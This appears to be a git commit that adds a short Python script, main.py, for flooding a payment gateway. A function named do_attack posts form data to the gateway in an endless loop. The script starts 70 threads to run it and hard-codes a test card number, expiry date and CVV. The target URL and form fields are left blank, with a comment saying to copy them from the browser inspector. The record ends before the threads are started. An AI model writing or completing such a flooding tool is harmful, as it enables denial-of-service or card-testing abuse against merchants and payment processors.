4c1e1ebfe227fda7040e64b4afe2efb47f067457
MichalDz <info@admi.tech>
2023-10-20 19:14:56 +0200

    First Commit

---
+++ main.py
@@ -0,0 +1,40 @@
+###################################
+# !/usr/bin/python
+# Python 3.10
+# (C) 2023 admi.tech
+###################################
+
+# Import main packages
+import requests
+import threading
+
+# Global Variables
+CARD_NUMBER = 4007000000027
+EXP_MONTH = 10
+EXP_YEAR = 23
+CVV = 234
+
+
+# Scripts
+
+def do_attack():
+    # Main loop
+    while True:
+        # Show answer from server
+        answer = requests.post(URL, data=data).text
+        print(answer)
+
+
+if __name__ == "__main__":
+    # URL where is payment gate
+    URL = ' '
+
+    # Data to send
+    # Open browser inspector
+    data = {
+
+    }
+
+    for i in range(70):
+        t = threading.Thread(target=do_attack)
+        t.daemon = True
